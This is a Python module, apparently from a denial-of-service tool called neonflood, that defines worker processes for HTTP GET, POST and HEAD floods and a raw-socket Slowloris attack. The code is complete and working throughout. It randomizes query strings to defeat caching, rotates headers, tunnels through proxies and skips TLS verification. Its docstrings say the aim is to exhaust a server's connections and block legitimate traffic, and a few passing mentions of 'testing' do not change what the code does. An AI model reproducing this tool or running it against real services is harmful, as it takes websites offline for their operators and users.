"""
neonflood/workers.py
====================
Attack worker processes for all supported modes.

Each worker is a multiprocessing.Process subclass that runs independently
and communicates back to the GUI/CLI via a shared Queue and SafeCounter.

Supported modes
---------------
get       — Repeated GET requests with randomized query strings and rotated headers.
post      — POST requests with randomized body payloads and content headers.
head      — HEAD requests (lightweight: no response body, maximum connection rate).
slowloris — Raw socket Slowloris attack: open many connections, send partial
            HTTP headers slowly, never complete the request.  The server holds
            each connection slot open indefinitely, exhausting its pool.

Proxy support
-------------
Workers accept a ``proxy`` tuple of (scheme, host, port).  For http.client-based
workers (GET/POST/HEAD) this uses HTTPConnection.set_tunnel() for CONNECT
proxying.  For Slowloris (raw socket) proxy support is not applicable since
the raw socket connects directly.

Rate limiting
-------------
Workers accept a ``rate_limit`` integer (requests/sec per worker).  Set to 0
for unlimited.  Implemented via a simple time-based throttle check.
"""

from multiprocessing import Process, Value
import http.client
import ssl
import socket
import random
import time

from .useragents import random_headers


# ─────────────────────────────────────────────────────────────────
#  Private helpers
# ─────────────────────────────────────────────────────────────────

def _make_conn(host, port, use_ssl, timeout=5, proxy=None):
    """
    Create and return an HTTP(S) connection object.

    Parameters
    ----------
    host     : str   — target hostname
    port     : int   — target port
    use_ssl  : bool  — wrap in TLS if True
    timeout  : int   — socket timeout in seconds
    proxy    : tuple | None — (scheme, proxy_host, proxy_port) or None

    Returns
    -------
    http.client.HTTPConnection | http.client.HTTPSConnection
    """
    if proxy:
        _scheme, phost, pport = proxy
        if use_ssl:
            ctx  = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(phost, pport, context=ctx, timeout=timeout)
            conn.set_tunnel(host, port)
        else:
            conn = http.client.HTTPConnection(phost, pport, timeout=timeout)
        return conn

    if use_ssl:
        ctx = ssl._create_unverified_context()
        return http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
    return http.client.HTTPConnection(host, port, timeout=timeout)


def _rand_path(base_path):
    """Append a random query string to defeat response caching."""
    return f"{base_path}?{random.randint(1, 99999)}={random.randint(1, 99999)}"


def _rand_body(size=512):
    """Generate a random alphanumeric string of the given byte length."""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(random.choices(chars, k=size))


# ─────────────────────────────────────────────────────────────────
#  Base worker
# ─────────────────────────────────────────────────────────────────

class BaseWorker(Process):
    """
    Abstract base class for all attack workers.

    Subclasses must implement ``run()``.  The ``_runnable`` shared Value
    can be toggled via ``stop()`` from the parent process to request a
    clean shutdown before ``terminate()`` is called.
    """

    def __init__(self, host, port, path, use_ssl, nr_socks,
                 counter, log_queue, timeout=5, proxy=None, rate_limit=0):
        """
        Parameters
        ----------
        host       : str           — target hostname (no scheme)
        port       : int           — target port number
        path       : str           — URL path component (e.g. "/")
        use_ssl    : bool          — True for HTTPS targets
        nr_socks   : int           — connections to open per loop iteration
        counter    : SafeCounter   — shared hit/fail counter
        log_queue  : Queue         — queue for (level, message) log tuples
        timeout    : int           — per-socket timeout in seconds
        proxy      : tuple | None  — (scheme, host, port) proxy tuple
        rate_limit : int           — max requests/sec (0 = unlimited)
        """
        super().__init__()
        self.host       = host
        self.port       = port
        self.path       = path
        self.use_ssl    = use_ssl
        self.nr_socks   = nr_socks
        self.counter    = counter
        self.log_queue  = log_queue
        self.timeout    = timeout
        self.proxy      = proxy
        self.rate_limit = rate_limit
        self._runnable  = Value('b', True)

    def stop(self):
        """Signal the worker to exit its loop cleanly on the next iteration."""
        with self._runnable.get_lock():
            self._runnable.value = False

    @property
    def runnable(self):
        """True while the worker should continue running."""
        return bool(self._runnable.value)

    def report(self, level, msg):
        """
        Send a log entry to the parent process.

        Parameters
        ----------
        level : str — one of HIT / FAIL / WARN / LOAD / SYS
        msg   : str — human-readable message
        """
        try:
            self.log_queue.put_nowait((level, msg))
        except Exception:
            pass  # never block a worker on a full queue

    def _throttle(self, start_time, req_count):
        """
        Sleep as needed to enforce the configured rate limit.

        Parameters
        ----------
        start_time : float — time.time() at start of current worker loop
        req_count  : int   — how many requests have been sent so far
        """
        if self.rate_limit > 0 and req_count > 0:
            elapsed  = time.time() - start_time
            expected = req_count / self.rate_limit
            if expected > elapsed:
                time.sleep(expected - elapsed)

    def run(self):
        raise NotImplementedError("Subclasses must implement run()")


# ─────────────────────────────────────────────────────────────────
#  GET flood worker
# ─────────────────────────────────────────────────────────────────

class GetWorker(BaseWorker):
    """
    Classic HTTP GET flood.

    Each loop iteration opens ``nr_socks`` connections, sends randomized
    GET requests on all of them, then reads and counts responses.
    Connections are closed after each batch and the loop repeats.
    """

    def run(self):
        req_count  = 0
        start_time = time.time()

        while self.runnable:
            socks = []
            try:
                self.report("LOAD", f"[GET] Opening {self.nr_socks} connections...")

                # Phase 1 — open connections
                for _ in range(self.nr_socks):
                    if not self.runnable:
                        break
                    try:
                        c = _make_conn(self.host, self.port, self.use_ssl,
                                       self.timeout, self.proxy)
                        socks.append(c)
                    except Exception as e:
                        self.report("FAIL", f"Connect error: {e}")

                # Phase 2 — send requests
                for conn in socks:
                    if not self.runnable:
                        break
                    try:
                        conn.request("GET", _rand_path(self.path),
                                     None, random_headers())
                        req_count += 1
                        self._throttle(start_time, req_count)
                    except Exception as e:
                        self.report("WARN", f"Send error: {e}")

                # Phase 3 — read responses
                for conn in socks:
                    if not self.runnable:
                        break
                    try:
                        res = conn.getresponse()
                        if res.status < 400:
                            self.counter.add_hit()
                            self.report("HIT", f"GET {res.status} — {self.host}")
                        else:
                            self.counter.add_fail()
                            self.report("FAIL", f"GET blocked {res.status}")
                        res.read()  # drain response body to reuse connection
                    except Exception:
                        self.counter.add_fail()
                        self.report("FAIL", "Connection dropped")

            except Exception as e:
                self.report("FAIL", f"Worker error: {e}")
                time.sleep(1)
            finally:
                for c in socks:
                    try:
                        c.close()
                    except Exception:
                        pass


# ─────────────────────────────────────────────────────────────────
#  POST flood worker
# ─────────────────────────────────────────────────────────────────

class PostWorker(BaseWorker):
    """
    HTTP POST flood with randomized body payloads.

    Sends between 256 and 2048 bytes of random alphanumeric data per
    request.  Useful for testing upload rate limiting and body parsing.
    """

    def run(self):
        req_count  = 0
        start_time = time.time()

        while self.runnable:
            socks = []
            try:
                self.report("LOAD", f"[POST] Opening {self.nr_socks} connections...")

                for _ in range(self.nr_socks):
                    if not self.runnable:
                        break
                    try:
                        c = _make_conn(self.host, self.port, self.use_ssl,
                                       self.timeout, self.proxy)
                        socks.append(c)
                    except Exception as e:
                        self.report("FAIL", f"Connect error: {e}")

                for conn in socks:
                    if not self.runnable:
                        break
                    try:
                        body    = _rand_body(random.randint(256, 2048))
                        headers = random_headers()
                        headers["Content-Type"]   = "application/x-www-form-urlencoded"
                        headers["Content-Length"] = str(len(body))
                        conn.request("POST", _rand_path(self.path), body, headers)
                        req_count += 1
                        self._throttle(start_time, req_count)
                    except Exception as e:
                        self.report("WARN", f"Send error: {e}")

                for conn in socks:
                    if not self.runnable:
                        break
                    try:
                        res = conn.getresponse()
                        if res.status < 400:
                            self.counter.add_hit()
                            self.report("HIT", f"POST {res.status} — {self.host}")
                        else:
                            self.counter.add_fail()
                            self.report("FAIL", f"POST blocked {res.status}")
                        res.read()
                    except Exception:
                        self.counter.add_fail()
                        self.report("FAIL", "Connection dropped")

            except Exception as e:
                self.report("FAIL", f"Worker error: {e}")
                time.sleep(1)
            finally:
                for c in socks:
                    try:
                        c.close()
                    except Exception:
                        pass


# ─────────────────────────────────────────────────────────────────
#  HEAD flood worker
# ─────────────────────────────────────────────────────────────────

class HeadWorker(BaseWorker):
    """
    HTTP HEAD flood.

    HEAD requests are identical to GET but the server must not return a
    response body.  This maximises connection rate while minimising
    outbound bandwidth.  Effective for testing connection limits.
    """

    def run(self):
        req_count  = 0
        start_time = time.time()

        while self.runnable:
            socks = []
            try:
                self.report("LOAD", f"[HEAD] Opening {self.nr_socks} connections...")

                for _ in range(self.nr_socks):
                    if not self.runnable:
                        break
                    try:
                        c = _make_conn(self.host, self.port, self.use_ssl,
                                       self.timeout, self.proxy)
                        socks.append(c)
                    except Exception as e:
                        self.report("FAIL", f"Connect error: {e}")

                for conn in socks:
                    if not self.runnable:
                        break
                    try:
                        conn.request("HEAD", _rand_path(self.path),
                                     None, random_headers())
                        req_count += 1
                        self._throttle(start_time, req_count)
                    except Exception as e:
                        self.report("WARN", f"Send error: {e}")

                for conn in socks:
                    if not self.runnable:
                        break
                    try:
                        res = conn.getresponse()
                        if res.status < 400:
                            self.counter.add_hit()
                            self.report("HIT", f"HEAD {res.status} — {self.host}")
                        else:
                            self.counter.add_fail()
                            self.report("FAIL", f"HEAD blocked {res.status}")
                        # HEAD responses have no body — do not call res.read()
                    except Exception:
                        self.counter.add_fail()
                        self.report("FAIL", "Connection dropped")

            except Exception as e:
                self.report("FAIL", f"Worker error: {e}")
                time.sleep(1)
            finally:
                for c in socks:
                    try:
                        c.close()
                    except Exception:
                        pass


# ─────────────────────────────────────────────────────────────────
#  Slowloris worker
# ─────────────────────────────────────────────────────────────────

class SlowlorisWorker(BaseWorker):
    """
    Slowloris low-bandwidth application-layer attack.

    How it works
    ------------
    1.  Open as many raw TCP sockets as configured (``nr_socks``).
    2.  Send a partial HTTP/1.1 request header on each — just enough to
        look like a real browser starting a request, but intentionally
        omitting the final blank line (``\\r\\n``) that would complete it.
    3.  Every ``KEEP_ALIVE_INTERVAL`` seconds send another header line on
        each open socket so the server's read timeout does not expire.
    4.  The server holds each connection slot open indefinitely waiting
        for the request to finish, eventually exhausting its connection
        pool and blocking legitimate traffic.
    5.  Dead sockets (the server closed them) are detected, counted as
        failures, and replaced with fresh connections on the next tick.

    This attack is effective with very little bandwidth and is the same
    technique used by tools like ``slowhttptest`` and ``PyLoris``.

    Note: Slowloris does not work through HTTP proxies (raw socket only).
    """

    KEEP_ALIVE_INTERVAL = 15  # seconds between keep-alive header sends

    def run(self):
        sockets = []
        self.report("LOAD", f"[SLOWLORIS] Targeting {self.host}:{self.port} "
                            f"with up to {self.nr_socks} held connections...")

        while self.runnable:
            # ── Fill connection pool ──────────────────────────────────
            while len(sockets) < self.nr_socks and self.runnable:
                try:
                    s = self._open_socket()
                    if s is not None:
                        sockets.append(s)
                        self.counter.add_hit()
                        self.report("HIT",
                                    f"[SLOWLORIS] Holding {len(sockets)}/{self.nr_socks}")
                except Exception as e:
                    self.report("WARN", f"Socket open failed: {e}")
                    time.sleep(0.1)

            # ── Send keep-alive header to every open socket ───────────
            dead = []
            for s in sockets:
                if not self.runnable:
                    break
                try:
                    # Send one more incomplete header line — keeps the
                    # connection alive without ever completing the request
                    s.send(f"X-Keep-Alive: {random.randint(1, 9999)}\r\n"
                           .encode("utf-8"))
                except Exception:
                    dead.append(s)
                    self.counter.add_fail()
                    self.report("FAIL", "[SLOWLORIS] Socket dropped — will replace")

            # ── Remove dead sockets ───────────────────────────────────
            for s in dead:
                try:
                    s.close()
                except Exception:
                    pass
                sockets.remove(s)

            self.report("LOAD",
                        f"[SLOWLORIS] Holding {len(sockets)}/{self.nr_socks} connections")
            time.sleep(self.KEEP_ALIVE_INTERVAL)

        # ── Cleanup on exit ───────────────────────────────────────────
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    def _open_socket(self):
        """
        Open a raw TCP socket and send a partial HTTP request header.

        Returns the open socket on success, or None on failure.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)

            if self.use_ssl:
                ctx = ssl._create_unverified_context()
                s   = ctx.wrap_socket(s, server_hostname=self.host)

            s.connect((self.host, self.port))

            # Partial HTTP/1.1 request — intentionally missing the final \r\n
            ua = random_headers()["User-Agent"]
            partial = (
                f"GET {_rand_path(self.path)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"X-Request-ID: {random.randint(100000, 999999)}\r\n"
            )
            s.send(partial.encode("utf-8"))
            return s

        except Exception as e:
            self.report("FAIL", f"[SLOWLORIS] Socket error: {e}")
            return None


# ─────────────────────────────────────────────────────────────────
#  Worker factory
# ─────────────────────────────────────────────────────────────────

MODE_MAP = {
    "get":       GetWorker,
    "post":      PostWorker,
    "head":      HeadWorker,
    "slowloris": SlowlorisWorker,
}


def create_worker(mode, host, port, path, use_ssl, nr_socks,
                  counter, log_queue, timeout=5, proxy=None, rate_limit=0):
    """
    Instantiate and return a worker process for the given attack mode.

    Parameters
    ----------
    mode       : str          — one of get / post / head / slowloris
    host       : str          — target hostname
    port       : int          — target port
    path       : str          — URL path (e.g. "/")
    use_ssl    : bool         — True for HTTPS
    nr_socks   : int          — connections per loop / max held (Slowloris)
    counter    : SafeCounter  — shared counters
    log_queue  : Queue        — log message queue
    timeout    : int          — socket timeout seconds (default 5)
    proxy      : tuple|None   — (scheme, host, port) or None
    rate_limit : int          — requests/sec cap per worker (0=unlimited)

    Returns
    -------
    BaseWorker subclass instance (not yet started)
    """
    cls = MODE_MAP.get(mode.lower(), GetWorker)
    return cls(
        host=host, port=port, path=path, use_ssl=use_ssl,
        nr_socks=nr_socks, counter=counter, log_queue=log_queue,
        timeout=timeout, proxy=proxy, rate_limit=rate_limit,
    )
